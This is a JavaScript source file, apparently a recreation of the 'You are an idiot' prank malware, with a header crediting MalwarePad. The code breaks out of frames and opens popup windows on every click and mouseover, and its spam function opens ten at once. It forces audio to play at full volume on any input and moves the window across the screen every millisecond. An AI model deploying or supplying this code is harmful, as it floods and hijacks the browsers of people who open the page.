/* 
    * Written by MalwarePad https://malwarepad.com
*/

if (top.location != location) {
  top.location.href = location.href;
}
var POPUP_WIDTH = 350;
var POPUP_HEIGHT = 370;
var OFFSET_MIN_MULTIPLIER = 1;
var OFFSET_MAX_MULTIPLIER = 7;
var OFFSET_STEP = 5;
function reopen() {
  var left = Math.floor(Math.random() * Math.max(1, screen.width - POPUP_WIDTH));
  var topPosition = Math.floor(
    Math.random() * Math.max(1, screen.height - POPUP_HEIGHT)
  );
  window.open(
    "popup.html",
    "",
    "blankmenubar=no,status=no,toolbar=noresizable=no,width=" +
      POPUP_WIDTH +
      ",height=" +
      POPUP_HEIGHT +
      ",left=" +
      left +
      ",top=" +
      topPosition +
      ",titlebar=no,alwaysRaised=yes"
  );
}
function randomOffset() {
  var magnitudeMultiplier =
    Math.floor(Math.random() * OFFSET_MAX_MULTIPLIER) + OFFSET_MIN_MULTIPLIER;
  var direction = Math.random() < 0.5 ? -1 : 1;
  return magnitudeMultiplier * direction * OFFSET_STEP;
}
function spam() {
  for (var i = 0; i < 10; i++) {
    reopen();
  }
  return "You are an idiot!";
}
var audioRetryTimer = null;
function playAudio(audio) {
  if (!audio) return;
  var p = audio.play();
  if (p && typeof p.catch === "function") {
    p.catch(function () {
      if (audioRetryTimer) return;
      audioRetryTimer = setTimeout(function () {
        audioRetryTimer = null;
        if (audio.readyState === 0) {
          audio.load();
        }
        audio.play().catch(function () {});
      }, 150);
    });
  }
}
function boostAudio() {
  var audio = document.getElementById("idiot-audio");
  if (!audio) return;
  audio.muted = false;
  audio.volume = 1.0;
  playAudio(audio);
}
function init() {
  document.body.onclick = function () {
    reopen();
    boostAudio();
  };
  document.body.onmouseover = function () {
    reopen();
    boostAudio();
  };
  document.body.onmousemove = function () {
    boostAudio();
  };
  document.body.onpointerdown = function () {
    boostAudio();
  };
  document.body.onkeydown = function () {
    boostAudio();
  };
  playBall();
  if (typeof window.bookmark === "function") {
    window.bookmark();
  }
  reopen();
}
var xOff = randomOffset(),
  yOff = randomOffset(),
  xPos = Math.floor(Math.random() * Math.max(1, screen.width - POPUP_WIDTH)),
  yPos = Math.floor(Math.random() * Math.max(1, screen.height - POPUP_HEIGHT)),
  flagRun = true;
function newXlt() {
  xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
  window.focus();
}
function newXrt() {
  xOff = Math.ceil(7 * Math.random()) * 5 - 10;
}
function newYup() {
  yOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
}
function newYdn() {
  yOff = Math.ceil(7 * Math.random()) * 5 - 10;
}
function fOff() {
  flagrun = false;
}
function playBall() {
  xPos += xOff;
  yPos += yOff;
  if (xPos > screen.width - POPUP_WIDTH) {
    newXlt();
  }
  if (xPos < 0) {
    newXrt();
  }
  if (yPos > screen.height - POPUP_HEIGHT) {
    newYup();
  }
  if (yPos < 0) {
    newYdn();
  }
  if (flagRun) {
    window.moveTo(xPos, yPos);
    setTimeout(playBall, 1);
  }
}
